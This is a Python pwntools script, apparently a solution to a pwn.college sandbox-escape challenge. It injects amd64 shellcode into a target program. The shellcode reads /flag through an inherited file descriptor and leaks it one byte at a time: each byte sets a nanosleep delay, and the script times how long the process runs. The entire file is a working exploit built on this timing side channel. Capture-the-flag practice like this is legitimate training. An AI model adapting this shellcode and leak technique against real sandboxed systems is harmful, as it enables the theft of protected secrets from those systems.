#!/bin/python

import os
import sys
import time
from pwn import * 

context.log_level = 'error'
context.arch = 'amd64'

FLAG_LEN = 58 
WRITABLE_MEM = 0x1337000 + 0x100
FLAG_MEM = WRITABLE_MEM  + 0x700

CONST = 32

flag = bytearray(FLAG_LEN)

for i in range(len('pwn.college'),FLAG_LEN):
    if (len(sys.argv) > 2):
        proc = process(['sudo', 'strace', sys.argv[1]])
    else:
        proc = process([sys.argv[1], '/flag'], close_fds=False)

    sc_bytes = (shellcraft.read(3, FLAG_MEM, FLAG_LEN)
              +
                f'''
                    mov rdi, {WRITABLE_MEM}
                    mov rax, {FLAG_MEM+i}
                    mov al, [rax]
                    sub al, {CONST}
                    mov byte ptr  [rdi], al
                    mov qword ptr [rdi+8], 0
                    mov rax, 0x23
                    syscall
                 '''
    )
    proc.send(asm(sc_bytes, arch='amd64'))

    start = time.time()
    byte = proc.poll(block=True)
    byte = time.time() - start + CONST

    print(f"Iteration #{i}' byte = {(byte)} / {chr(int(byte))}")

    if byte >= 0 and byte <= 255:
        flag[i] = int(byte)
    else: 
        print(f"Iteration #{i} has invalid byte ({byte})")

print(flag)
